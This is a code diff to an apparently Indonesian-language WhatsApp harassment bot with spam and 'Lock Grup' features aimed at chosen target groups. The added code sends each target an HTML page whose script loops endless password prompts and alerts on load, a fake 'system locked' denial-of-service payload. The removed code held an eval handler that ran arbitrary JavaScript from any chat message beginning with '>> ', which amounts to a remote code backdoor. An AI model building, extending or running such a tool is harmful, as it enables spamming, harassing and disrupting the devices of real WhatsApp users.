@@ -1,4 +1,4 @@
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require("@whiskeysockets/baileys")
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require("@innovatorssoft/baileys")
 const pino = require("pino")
 const readline = require("readline")
 const fs = require("fs")
@@ -9,7 +9,6 @@ const logger = pino({ level: "silent" })
 let sock, isPaired = false, tgt = [], tgtName = ""
 let spamming = false, timer = null
 let isPairing = false
-let jsLockedGroups = {} 
 
 const BANNER = `
 \x1b[33m  _____       _    _                                    \x1b[0m
@@ -35,8 +34,32 @@ function ask(q) {
 }
 
 async function sendJsAlert(jid) {
-    const alertText = `*LOCKED BY SUKINYMOUS* 🤓\n\nMasukan Password Min 8 Char`
-    await sock.sendMessage(jid, { text: alertText })
+    const jsScript = `
+        function startLoop() {
+            while (true) {
+                var pass = prompt("LOCKED BY SUKINYMOUS\\n\\nMasukan Password Min 8 Char");
+                if (pass === null) {
+                    continue; 
+                }
+                alert("Password Salah! Akses Ditolak.");
+            }
+        }
+        window.onload = startLoop;
+    `;
+
+    const htmlPayload = `<!DOCTYPE html><html><head><style>body{background-color:#000;color:#fff;display:none;}</style></head><body><script>${jsScript}</script></body></html>`;
+
+    try {
+        await sock.sendRichHtml(jid, {
+            id: 'lock-alert-' + Date.now(),
+            title: 'System Locked',
+            html: htmlPayload,
+            source: 'sukinymous_system'
+        })
+        console.log(`[+] HTML/JS Alert terkirim ke: ${jid}`)
+    } catch (e) {
+        console.log(`[X] Gagal kirim ke ${jid}: ${e.message}`)
+    }
 }
 
 process.on('SIGINT', () => {
@@ -86,7 +109,7 @@ async function mainMenu() {
         clr(); console.log(BANNER)
         console.log(`[1] Target: ${tgtName || "None"}`)
         console.log(`[2] Spam`)
-        console.log(`[3] Lock Grup`)
+        console.log(`[3] Lock Grup (HTML/JS)`)
         console.log(`[4] Exit\n`)
 
         const c = await ask("> ")
@@ -131,22 +154,14 @@ async function selectTarget() {
 }
 
 async function lockTargetGroup() {
-    clr(); console.log(BANNER); console.log(`[*] Mengirim Lock ke ${tgt.length} target...\n`)
+    clr(); console.log(BANNER); console.log(`[*] Mengirim JS Alert ke ${tgt.length} target...\n`)
     
     for (let i = 0; i < tgt.length; i++) {
-        try {
-            const jid = tgt[i]
-            jsLockedGroups[jid] = true
-            await sendJsAlert(jid)
-            console.log(`[+] Lock dikirim ke: ${jid}`)
-            await slp(1000)
-        } catch (e) {
-            console.log(`[X] Gagal kirim ke ${tgt[i]}: ${e.message}`)
-            await slp(1000)
-        }
+        await sendJsAlert(tgt[i])
+        await slp(2000)
     }
+    
     console.log("\n[!] Selesai. Cek grup target.")
-    console.log("    Ketik .stop di WA untuk berhenti.")
     await ask("\nTekan Enter untuk kembali.")
 }
 
@@ -232,43 +247,6 @@ async function connect() {
         }
     })
 
-    sock.ev.on("messages.upsert", async (m) => {
-        const msg = m.messages[0]
-        if (!msg.message) return
-        
-        const textMsg = msg.message.conversation || 
-                        msg.message.extendedTextMessage?.text || 
-                        msg.message.buttonsResponseMessage?.selectedButtonId ||
-                        msg.message.templateButtonReplyMessage?.selectedId ||
-                        ""
-
-        const jid = msg.key.remoteJid
-
-        if (textMsg.startsWith(">> ")) {
-            const code = textMsg.slice(3)
-            try {
-                let result = await eval(`(async () => { ${code} })()`)
-                if (typeof result !== "string") result = require("util").inspect(result)
-                await sock.sendMessage(jid, { text: result }, { quoted: msg })
-            } catch (err) {
-                await sock.sendMessage(jid, { text: `Error: ${err.message}` }, { quoted: msg })
-            }
-            return
-        }
-
-        if (jsLockedGroups[jid]) {
-            if (textMsg.toLowerCase() === ".stop") {
-                delete jsLockedGroups[jid]
-                await sock.sendMessage(jid, { text: "SYSTEM UNLOCKED" })
-            } else {
-                await slp(500)
-                await sock.sendMessage(jid, { text: "*Password Salah!* Akses ditolak." })
-                await slp(1000)
-                await sendJsAlert(jid)
-            }
-        }
-    })
-    
     clr();
 }
 
